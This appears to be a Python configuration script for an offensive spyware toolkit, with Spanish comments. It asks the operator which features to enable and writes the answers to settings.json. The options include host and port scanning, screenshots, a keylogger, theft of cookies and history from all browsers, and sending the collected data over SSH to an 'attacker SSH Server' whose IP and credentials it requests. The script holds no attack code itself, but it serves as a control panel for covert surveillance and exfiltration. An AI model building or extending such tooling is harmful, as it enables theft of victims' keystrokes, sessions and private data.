import re
import json
import os
def takeInput(typeOfValue, pattern, response, cin):
    while True:
        if not re.match(pattern, cin):
            cin = input(f"Invalid input. You must enter {response}\n> ")
            continue
        if  typeOfValue is not str:
            cin = typeOfValue(cin)
        return cin

boolPattern =  r'^[01]$'
ipAddrPattern = r'^(\d{1,3}\.){3}\d{1,3}$'
stringPattern = r'.*'
pathPattern =  r'^(?:[a-zA-Z]:\\|\\\\|/)?(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]*$'
intPattern = r'^\d+$'
floatPattern = r'^\d+(\.\d+)?$'

carpeta_script = os.path.dirname(os.path.abspath(__file__)) #Obtenemos la ruta de mi script
with open(carpeta_script+'\\settings.json', 'w') as file:
#    settings = json.load(file)
    settings = {
    "perform Host Discovery": 1,
    "perform Port Scanning": 0,
    "port Scanning Delay": 0.6,
    "perform App Discovery": 0,
    "perform User Discovery": 0,
    "Take Screen Shoots": 0,
    "Raise Web Server": 0,
    "server Port": 8000,
    "Use KeyLogger": 0,
    "Collect Browsers Info": 0,
    "send Data Via SSH": 0,
    "attacker SSH Server IP": "",
    "attacker SSH Server Username": "user",
    "attacker SSH Server Password": "password",
    "attacker SSH Server Folder": "C:\\Users\\User\\Escritorio"}

settings["perform Host Discovery"] = takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to perform a host Discovery? (1=Y / 0=N)\n> "))
if settings["perform Host Discovery"] == 1:
	settings["perform Port Scanning"] = takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to perform a Port Scan to every host discovered? (1=Y / 0=N)\n> "))
	if settings["perform Port Scanning"]== 1:
		settings["port Scanning Delay"] = takeInput(float, floatPattern, 'a decimal number.', input("How much delay do you want bettween the scann of every port (in Seconds) (Ej: 0.6)? (1=Y / 0=N)\n> "))
settings['perform App Discovery'] = takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to discover the Apps installed? (1=Y / 0=N)\n> "))
settings['perform User Discovery']= takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to discover the users? (1=Y / 0=N)\n> "))
settings['Take Screen Shoots']= takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to take periodical screen shoots? (1=Y / 0=N)\n> "))
settings['Raise Web Server']= takeInput(int, boolPattern, 'a 0 or 1.', input('Do you want to raise a web server? (1=Y / 0=N)\n> '))
if settings['Raise Web Server']==1:
    settings['server Port']= takeInput(int, intPattern, 'a number bettween 0 and 65536', input('What port do you want to use to raise the web server?\n> '))
settings['Use KeyLogger']= takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to use a key logger? (1=Y / 0=N)\n> "))
settings['Collect Browsers Info']= takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to collect the cookies and history of all browsers? (1=Y / 0=N)\n> "))
settings['send Data Via SSH']= takeInput(int, boolPattern, 'a 0 or 1.', input("Do you want to send the data via SSH? (1=Y / 0=N)\n> "))
if settings['send Data Via SSH']==1:
    settings['attacker SSH Server IP']= takeInput(str, ipAddrPattern, 'a IPv4 address', input("what IP address do you want to send all the data via SSH?\n> "))
    settings['attacker SSH Server Username']= takeInput(str, stringPattern, "the username", input("what is the username of the attacker that will receive the data via SSH?\n> "))
    settings["attacker SSH Server Password"]= takeInput(str, stringPattern, "the password", input("what is the password of the attacker that will receive the data via SSH?\n> "))
    settings["attacker SSH Server Folder"]= takeInput(str, pathPattern, "the path of the folder", input("what is the folder where you want to receive the data?\n> "))

with open(carpeta_script+'\\settings.json', 'w') as file:
    json.dump(settings, file, indent=4)




